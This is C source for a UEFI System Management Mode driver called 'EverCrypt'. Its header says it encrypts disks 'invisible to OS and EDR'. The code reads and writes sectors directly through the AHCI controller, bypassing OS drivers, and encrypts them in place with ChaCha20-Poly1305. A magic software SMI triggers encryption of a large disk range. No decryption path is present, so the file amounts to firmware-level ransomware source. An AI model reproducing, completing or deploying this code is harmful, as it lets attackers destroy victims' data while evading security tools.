/** @file
  EverCrypt SMM Handler - Ring -2 Encryption Engine
  
  Encrypts disks from System Management Mode, invisible to OS and EDR
**/

#include <PiSmm.h>
#include <Library/SmmServicesTableLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Library/IoLib.h>
#include <Library/SynchronizationLib.h>
#include <Protocol/SmmCpu.h>
#include <Protocol/SmmSwDispatch2.h>

#include "../Include/EverCryptProto.h"

//
// External assembly functions
//
extern VOID ChaCha20Poly1305Encrypt(
  UINT8  *Key,
  UINT8  *Nonce,
  UINT8  *PlainText,
  UINT32 Length,
  UINT8  *CipherText,
  UINT8  *Tag
);

//
// Global Variables
//
STATIC UINT8  mEncryptionKey[EVERCRYPT_KEY_SIZE];
STATIC UINT8  mNonce[EVERCRYPT_NONCE_SIZE];
STATIC BOOLEAN mEncryptionActive = FALSE;
STATIC SPIN_LOCK mSmmLock;

//
// Direct disk I/O (bypassing OS drivers)
//
#define AHCI_BASE_ADDR        0xF7E00000
#define AHCI_PORT0_CLB        (AHCI_BASE_ADDR + 0x100)
#define AHCI_PORT0_FB         (AHCI_BASE_ADDR + 0x108)

#pragma pack(1)

typedef struct {
  UINT32  CommandListBaseL;
  UINT32  CommandListBaseH;
  UINT32  FisBaseL;
  UINT32  FisBaseH;
  UINT32  InterruptStatus;
  UINT32  InterruptEnable;
  UINT32  Command;
  UINT32  Reserved;
  UINT32  TaskFileData;
  UINT32  Signature;
  UINT32  SataStatus;
  UINT32  SataControl;
  UINT32  SataError;
  UINT32  SataActive;
  UINT32  CommandIssue;
} AHCI_PORT_REGS;

typedef struct {
  UINT8   CmdFisType;
  UINT8   Flags;
  UINT8   Command;
  UINT8   Features;
  UINT8   LbaLow;
  UINT8   LbaMid;
  UINT8   LbaHigh;
  UINT8   Device;
  UINT8   LbaLowExp;
  UINT8   LbaMidExp;
  UINT8   LbaHighExp;
  UINT8   FeaturesExp;
  UINT8   SectorCount;
  UINT8   SectorCountExp;
  UINT8   Reserved1;
  UINT8   Control;
  UINT32  Reserved2;
} ATA_COMMAND_FIS;

#pragma pack()

/**
  Read sector directly from AHCI controller
  
  @param[in]  Lba                 Logical Block Address
  @param[out] Buffer              Output buffer (512 bytes)
  
  @retval EFI_SUCCESS             Read successful
**/
EFI_STATUS
SmmReadSector (
  IN  UINT64  Lba,
  OUT UINT8   *Buffer
  )
{
  volatile AHCI_PORT_REGS  *Port;
  ATA_COMMAND_FIS          Fis;
  
  Port = (volatile AHCI_PORT_REGS *)AHCI_PORT0_CLB;
  
  // Build ATA READ DMA command
  ZeroMem(&Fis, sizeof(Fis));
  Fis.CmdFisType   = 0x27;  // Register FIS - H2D
  Fis.Flags        = 0x80;  // Command bit
  Fis.Command      = 0x25;  // READ DMA EXT
  Fis.LbaLow       = (UINT8)(Lba & 0xFF);
  Fis.LbaMid       = (UINT8)((Lba >> 8) & 0xFF);
  Fis.LbaHigh      = (UINT8)((Lba >> 16) & 0xFF);
  Fis.LbaLowExp    = (UINT8)((Lba >> 24) & 0xFF);
  Fis.LbaMidExp    = (UINT8)((Lba >> 32) & 0xFF);
  Fis.LbaHighExp   = (UINT8)((Lba >> 40) & 0xFF);
  Fis.Device       = 0x40;  // LBA mode
  Fis.SectorCount  = 1;
  
  // Issue command (simplified - production needs DMA setup)
  CopyMem((VOID *)(UINTN)AHCI_PORT0_FB, &Fis, sizeof(Fis));
  MmioWrite32((UINTN)&Port->CommandIssue, 0x01);
  
  // Wait for completion (simplified)
  while (MmioRead32((UINTN)&Port->CommandIssue) & 0x01) {
    CpuPause();
  }
  
  // Copy data from FIS buffer
  CopyMem(Buffer, (VOID *)(UINTN)(AHCI_PORT0_FB + 0x40), 512);
  
  return EFI_SUCCESS;
}

/**
  Write sector directly to AHCI controller
  
  @param[in] Lba                  Logical Block Address
  @param[in] Buffer               Input buffer (512 bytes)
  
  @retval EFI_SUCCESS             Write successful
**/
EFI_STATUS
SmmWriteSector (
  IN UINT64  Lba,
  IN UINT8   *Buffer
  )
{
  volatile AHCI_PORT_REGS  *Port;
  ATA_COMMAND_FIS          Fis;
  
  Port = (volatile AHCI_PORT_REGS *)AHCI_PORT0_CLB;
  
  // Build ATA WRITE DMA command
  ZeroMem(&Fis, sizeof(Fis));
  Fis.CmdFisType   = 0x27;
  Fis.Flags        = 0x80;
  Fis.Command      = 0x35;  // WRITE DMA EXT
  Fis.LbaLow       = (UINT8)(Lba & 0xFF);
  Fis.LbaMid       = (UINT8)((Lba >> 8) & 0xFF);
  Fis.LbaHigh      = (UINT8)((Lba >> 16) & 0xFF);
  Fis.LbaLowExp    = (UINT8)((Lba >> 24) & 0xFF);
  Fis.LbaMidExp    = (UINT8)((Lba >> 32) & 0xFF);
  Fis.LbaHighExp   = (UINT8)((Lba >> 40) & 0xFF);
  Fis.Device       = 0x40;
  Fis.SectorCount  = 1;
  
  // Copy data to FIS buffer
  CopyMem((VOID *)(UINTN)(AHCI_PORT0_FB + 0x40), Buffer, 512);
  
  // Issue command
  CopyMem((VOID *)(UINTN)AHCI_PORT0_FB, &Fis, sizeof(Fis));
  MmioWrite32((UINTN)&Port->CommandIssue, 0x01);
  
  // Wait for completion
  while (MmioRead32((UINTN)&Port->CommandIssue) & 0x01) {
    CpuPause();
  }
  
  return EFI_SUCCESS;
}

/**
  Encrypt single sector using ChaCha20-Poly1305
  
  @param[in]  PlainSector         Input sector (512 bytes)
  @param[out] CipherSector        Output sector (512 bytes)
  @param[out] Tag                 Authentication tag (16 bytes)
**/
VOID
EncryptSector (
  IN  UINT8  *PlainSector,
  OUT UINT8  *CipherSector,
  OUT UINT8  *Tag
  )
{
  // Increment nonce for each sector
  (*(UINT64 *)mNonce)++;
  
  // Call assembly implementation
  ChaCha20Poly1305Encrypt(
    mEncryptionKey,
    mNonce,
    PlainSector,
    512,
    CipherSector,
    Tag
  );
}

/**
  Encrypt disk range from SMM
  
  @param[in] StartLba             Start LBA
  @param[in] EndLba               End LBA
  
  @retval EFI_SUCCESS             Encryption complete
**/
EFI_STATUS
EncryptDiskRange (
  IN UINT64  StartLba,
  IN UINT64  EndLba
  )
{
  EFI_STATUS  Status;
  UINT64      CurrentLba;
  UINT8       PlainSector[512];
  UINT8       CipherSector[512];
  UINT8       Tag[16];
  UINTN       SectorsEncrypted;
  
  DEBUG((DEBUG_INFO, "[SMM] Encrypting LBA %lld to %lld\n", StartLba, EndLba));
  
  SectorsEncrypted = 0;
  
  for (CurrentLba = StartLba; CurrentLba <= EndLba; CurrentLba++) {
    
    // Read plain sector
    Status = SmmReadSector(CurrentLba, PlainSector);
    if (EFI_ERROR(Status)) {
      DEBUG((DEBUG_ERROR, "[SMM] Read failed at LBA %lld: %r\n", CurrentLba, Status));
      continue;
    }
    
    // Encrypt
    EncryptSector(PlainSector, CipherSector, Tag);
    
    // Write encrypted sector
    Status = SmmWriteSector(CurrentLba, CipherSector);
    if (EFI_ERROR(Status)) {
      DEBUG((DEBUG_ERROR, "[SMM] Write failed at LBA %lld: %r\n", CurrentLba, Status));
      continue;
    }
    
    SectorsEncrypted++;
    
    // Progress indicator every 1000 sectors
    if ((SectorsEncrypted % 1000) == 0) {
      DEBUG((DEBUG_INFO, "[SMM] Encrypted %d sectors\n", SectorsEncrypted));
    }
  }
  
  DEBUG((DEBUG_INFO, "[SMM] Encryption complete: %d sectors\n", SectorsEncrypted));
  
  return EFI_SUCCESS;
}

/**
  SMM Communication Handler
  
  Processes encryption commands from DXE
**/
EFI_STATUS
EFIAPI
SmmCommunicationHandler (
  IN     EFI_HANDLE  DispatchHandle,
  IN     CONST VOID  *Context,
  IN OUT VOID        *CommBuffer,
  IN OUT UINTN       *CommBufferSize
  )
{
  EVERCRYPT_SMM_COMM_HEADER    *Header;
  EVERCRYPT_SMM_ENCRYPT_DATA   *EncryptData;
  EVERCRYPT_SMM_KEY_DATA       *KeyData;
  
  if (CommBuffer == NULL || CommBufferSize == NULL) {
    return EFI_INVALID_PARAMETER;
  }
  
  Header = (EVERCRYPT_SMM_COMM_HEADER *)CommBuffer;
  
  AcquireSpinLock(&mSmmLock);
  
  switch (Header->Command) {
    
    case EVERCRYPT_CMD_DERIVE_KEY:
      KeyData = (EVERCRYPT_SMM_KEY_DATA *)CommBuffer;
      CopyMem(mEncryptionKey, KeyData->Key, EVERCRYPT_KEY_SIZE);
      DEBUG((DEBUG_INFO, "[SMM] Encryption key installed\n"));
      break;
    
    case EVERCRYPT_CMD_ENCRYPT_TRIGGER:
      EncryptData = (EVERCRYPT_SMM_ENCRYPT_DATA *)CommBuffer;
      
      if (!mEncryptionActive) {
        mEncryptionActive = TRUE;
        
        // Initialize nonce
        ZeroMem(mNonce, EVERCRYPT_NONCE_SIZE);
        
        // Start encryption
        EncryptDiskRange(EncryptData->StartLBA, EncryptData->EndLBA);
        
        mEncryptionActive = FALSE;
      }
      break;
    
    case EVERCRYPT_CMD_CHECK_INTEGRITY:
      // Return status
      *((UINT8 *)CommBuffer + sizeof(EVERCRYPT_SMM_COMM_HEADER)) = EVERCRYPT_STATUS_ACTIVE;
      break;
    
    default:
      DEBUG((DEBUG_WARN, "[SMM] Unknown command: 0x%02x\n", Header->Command));
      break;
  }
  
  ReleaseSpinLock(&mSmmLock);
  
  return EFI_SUCCESS;
}

/**
  Software SMI Handler
  
  Alternative trigger mechanism
**/
EFI_STATUS
EFIAPI
SoftwareSmiHandler (
  IN EFI_HANDLE  DispatchHandle,
  IN CONST VOID  *Context         OPTIONAL,
  IN OUT VOID    *CommBuffer      OPTIONAL,
  IN OUT UINTN   *CommBufferSize  OPTIONAL
  )
{
  DEBUG((DEBUG_INFO, "[SMM] Software SMI triggered\n"));
  
  // Check if encryption should start
  if (IoRead8(0xB2) == 0xEC) {  // Magic value from DXE
    if (!mEncryptionActive) {
      DEBUG((DEBUG_INFO, "[SMM] Starting encryption via SMI\n"));
      EncryptDiskRange(0, 0x10000000);  // First 128GB
    }
  }
  
  return EFI_SUCCESS;
}

/**
  SMM Driver Entry Point
**/
EFI_STATUS
EFIAPI
EverCryptSmmEntry (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  EFI_STATUS                      Status;
  EFI_SMM_SW_DISPATCH2_PROTOCOL   *SwDispatch;
  EFI_SMM_SW_REGISTER_CONTEXT     SwContext;
  EFI_HANDLE                      SwHandle;
  
  DEBUG((DEBUG_INFO, "[EverCrypt] SMM Handler loading...\n"));
  
  // Initialize spin lock
  InitializeSpinLock(&mSmmLock);
  
  // Register Software SMI handler
  Status = gSmst->SmmLocateProtocol(
                    &gEfiSmmSwDispatch2ProtocolGuid,
                    NULL,
                    (VOID **)&SwDispatch
                    );
  if (!EFI_ERROR(Status)) {
    SwContext.SwSmiInputValue = 0xEC;  // Magic SMI number
    
    Status = SwDispatch->Register(
                          SwDispatch,
                          SoftwareSmiHandler,
                          &SwContext,
                          &SwHandle
                          );
    if (EFI_ERROR(Status)) {
      DEBUG((DEBUG_ERROR, "[SMM] SW SMI register failed: %r\n", Status));
    } else {
      DEBUG((DEBUG_INFO, "[SMM] SW SMI handler registered (0xEC)\n"));
    }
  }
  
  DEBUG((DEBUG_INFO, "[EverCrypt] Ring -2 SMM active\n"));
  DEBUG((DEBUG_INFO, "[EverCrypt] Disk encryption ready\n"));
  
  return EFI_SUCCESS;
}